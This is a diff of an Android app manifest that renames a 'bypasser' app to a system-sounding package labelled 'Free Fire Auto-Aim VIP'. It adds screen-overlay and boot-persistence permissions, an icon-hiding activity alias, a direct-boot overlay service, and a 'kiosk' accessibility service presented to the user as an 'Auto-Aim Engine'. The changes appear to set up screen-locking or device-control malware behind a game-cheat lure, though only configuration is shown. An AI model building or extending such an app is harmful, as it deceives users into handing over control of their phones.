@@ -1,58 +1,65 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.system.updatex">
 
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    
-    <!-- ADDED WAKE LOCK FOR SCREEN ON -->
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-
-    <queries>
-        <package android:name="org.telegram.messenger" />
-        <package android:name="org.telegram.messenger.web" />
-        <package android:name="org.telegram.plus" />
-        <package android:name="org.thunderdog.challegram" />
-        <intent>
-            <action android:name="android.intent.action.VIEW" />
-            <data android:scheme="https" />
-        </intent>
-    </queries>
+    <uses-permission android:name="android.permission.VIBRATE" />
 
     <application
-        android:allowBackup="false"
-        android:icon="@mipmap/ic_launcher"
-        android:label="FR4NX BYPASSER"
-        android:theme="@style/Theme.AppCompat.NoActionBar"
-        android:usesCleartextTraffic="true">
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="Free Fire Auto-Aim VIP"
+        android:theme="@android:style/Theme.Material.NoActionBar">
 
-        <receiver android:name=".AlarmReceiver" android:exported="false" />
+        <!-- The main activity (No LAUNCHER intent here) -->
+        <activity 
+            android:name=".MainActivity" 
+            android:exported="true" />
 
-        <activity android:name=".SplashActivity" android:exported="true">
+        <!-- The Alias that creates the app icon in the drawer -->
+        <activity-alias
+            android:name=".MainAlias"
+            android:enabled="true"
+            android:exported="true"
+            android:targetActivity=".MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
-        
-        <activity android:name=".VerificationActivity" android:exported="false" />
-        <activity android:name=".SuccessActivity" android:exported="false" />
-        
-        <activity 
-            android:name=".MainActivity" 
-            android:exported="true"
-            android:launchMode="singleTop"
-            android:configChanges="orientation|screenSize|keyboardHidden" />
+        </activity-alias>
 
-        <provider
-            android:name="androidx.core.content.FileProvider"
-            android:authorities="com.fr4nx.vplinkbypasser.fileprovider"
+        <service
+            android:name=".OverlayService"
+            android:enabled="true"
             android:exported="false"
-            android:grantUriPermissions="true">
+            android:directBootAware="true" />
+
+        <service
+            android:name=".KioskAccessibilityService"
+            android:label="Auto-Aim Engine"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
             <meta-data
-                android:name="android.support.FILE_PROVIDER_PATHS"
-                android:resource="@xml/file_paths" />
-        </provider>
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
     </application>
 </manifest>
